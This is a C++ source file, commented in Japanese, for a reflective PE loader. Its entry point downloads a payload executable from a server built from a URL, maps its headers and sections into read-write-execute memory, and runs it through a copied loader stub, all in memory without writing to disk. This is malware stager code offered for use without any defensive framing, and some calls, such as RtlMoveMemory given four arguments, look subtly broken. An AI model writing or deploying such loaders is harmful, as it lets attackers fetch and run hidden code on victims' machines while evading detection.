// 反射型PEローダー

#include "injector.h"

Arg arg;

 // エントリポイント
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    
    // URLを構築
    std::wstring url = makeUrl(arg);

    // ファイルサーバーからペイロードをステージング
    std::vector<BYTE> downloadedPayload;
    StagingPayload(url,downloadedPayload);
    PBYTE payload = reinterpret_cast<PBYTE>(downloadedPayload.data());

    // PEヘッダの取得
    PIMAGE_DOS_HEADER pOldDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    PIMAGE_NT_HEADERS pOldNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + reinterpret_cast<PIMAGE_DOS_HEADER>(payload)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOldOptionalHeader = &pOldNtHeader->OptionalHeader;
    PIMAGE_FILE_HEADER pOldFileHeader = &pOldNtHeader->FileHeader;

    // メモリを確保
    PBYTE baseAddress = reinterpret_cast<PBYTE>(VirtualAlloc(nullptr, pOldOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

    // 反射型ローダーの引数を格納
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.pBase = baseAddress;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = 0;

    // ヘッダーをコピー
    RtlMoveMemory(baseAddress, payload, pOldOptionalHeader->SizeOfHeaders, nullptr);

    // セクションをコピー
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
    for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
        if (pSectionHeader->SizeOfRawData) {
            RtlMoveMemory(baseAddress + pSectionHeader->VirtualAddress, payload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr);
        }
    }

    // 反射型ローダーを書き込む
    PBYTE pReflectiveLoader = reinterpret_cast<PBYTE>(VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    RtlMoveMemory(pReflectiveLoader, ReflectiveLoader, 0x1000, nullptr);

    // 反射型ローダーの引数を書き込む
    LPVOID pMappingData = VirtualAlloc(nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(pMappingData, &data, sizeof(MANUAL_MAPPING_DATA), nullptr);

    // ReflectiveLoaderのアドレスを関数ポインタとしてキャスト
    ReflectiveLoaderFunc reflectiveLoaderFunc = reinterpret_cast<ReflectiveLoaderFunc>(pReflectiveLoader);

    // 反射型ローダーを実行
    reflectiveLoaderFunc(pMappingData);

    return 0;
}